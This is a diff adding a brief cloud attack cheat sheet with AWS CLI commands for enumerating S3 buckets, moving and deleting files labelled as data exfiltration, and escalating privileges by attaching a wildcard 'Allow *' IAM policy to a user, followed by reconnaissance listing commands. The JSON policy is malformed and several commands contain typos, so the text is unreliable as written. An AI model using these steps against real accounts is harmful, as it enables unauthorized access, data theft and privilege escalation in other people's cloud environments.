@@ -1,0 +1,52 @@
+s3 bucket enumearation
+-----------------------
+python ./s3scanner.py --include-closed --out-file found.txt --dump names.txt 
+
+data exfilterate
+-------------------
+aws configure --profile s3bucketname
+<---give--access--key&ID---->
+
+aws s3 ls s3://s3address --profile s3profile : directory listing
+
+
+aws s3 mv secret.txt s3://bucketid
+aws s3 rm secret.txt s3://bucketid
+
+privilege_escalation
+--------------------
+
+user default output would be in : json
+touch user_policy.json
+
+save it =>
+
+{
+ "Version": 2012-10-17",
+ "Statement: {
+	{
+	 "Effect:"Allow",
+         "Action":"*",
+         "Resource":"*",
+	}
+      ]
+}
+	
+
+
+aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
+
+aws iam attach user-policy --user-name test --policy-arn arn:aws:iam::account-id:policy/user-policy
+
+--this policy would be added user .i.e test ----
+
+aws iam list-attached-user-policies -user-name test
+
+data-exfilterate
+----------------
+aws sapi list-buckets --query "Buckets[].Name"
+aws iam list-user-policies
+aws iam list-role-policies
+aws iam list-group-policies
+aws iam create-user
+
